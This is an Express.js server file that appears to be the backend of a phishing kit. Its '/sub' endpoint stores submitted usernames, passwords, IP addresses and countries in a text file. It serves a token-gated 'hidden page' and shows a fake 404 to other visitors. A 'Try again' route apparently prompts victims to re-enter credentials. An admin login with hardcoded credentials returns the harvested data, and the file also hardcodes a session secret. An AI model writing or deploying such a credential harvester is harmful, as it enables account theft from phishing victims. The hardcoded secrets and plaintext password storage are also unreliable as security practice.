const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

const dataFolderPath = path.join(__dirname, 'data');
const dataFilePath = path.join(dataFolderPath, 'data.txt');

// Ensure the data folder exists
if (!fs.existsSync(dataFolderPath)) {
    fs.mkdirSync(dataFolderPath, { recursive: true });
}

app.use(bodyParser.json());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'))); 

app.use(express.urlencoded({ extended: true }));

app.set('views', path.join(__dirname, 'views'));

// Set up session management
app.use(session({
    secret: 'yourSecretKey',
    resave: false,
    saveUninitialized: true,
}));
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'login.html'));
});

// Handle login form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (username === correctUsername && password === correctPassword) {
        // Read the data from the text file
        fs.readFile(dataFilePath, 'utf8', (err, data) => {
            if (err) {
                return res.status(500).send('Error reading data file');
            }

            // Parse the data from data.txt (assuming each line is a JSON object)
            const jsonData = data.trim().split('\n').map(line => JSON.parse(line));

            // Render the page with the data (send as a JSON response)
            res.json({ data: jsonData });
        });
    } else {
        res.status(401).send('Invalid credentials');
    }
});

// Route for showing the data
app.get('/data', (req, res) => {
    // Render the data page (data.html)
    res.sendFile(path.join(__dirname, 'views', 'data.html'));
});
// Hardcoded login credentials
const correctUsername = "admin";
const correctPassword = "password123";


// Route for the homepage
app.get('/', (req, res) => {
    const token = crypto.randomUUID();
    req.session.token = token; // Store the token in the session
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Route to get session token for client-side access
app.get('/get-token', (req, res) => {
    if (req.session.token) {
        res.json({ token: req.session.token });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

// Route for the hidden page (token-protected)
app.get('/ij', (req, res) => {
    const { token } = req.query;

    // Check if the session token matches the URL token
    if (req.session.token && token === req.session.token) {
        res.sendFile(path.join(__dirname, 'views', 'ii.html'));
    } else {
        // If tokens don't match or are missing, respond with a 404
        res.status(404).send('<h1>404 Not Found</h1><p>The page you are looking for does not exist.</p>');
    }
});


// Endpoint to handle the submission of credentials
app.post('/sub', (req, res) => {
    const { username, password, ip, country } = req.body;

    // Save the received data into a JSON object format
    const userData = {
        username,
        password,
        ip,
        country
    };

    // Append data to a .txt file (as JSON format)
    fs.appendFile(dataFilePath, JSON.stringify(userData) + '\n', (err) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Error saving data' });
        }

        // Respond with a success message
        res.json({ success: true });
    });
});



// Success route (after 3 attempts)
app.get('/success', (req, res) => {
    res.send('Try again');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
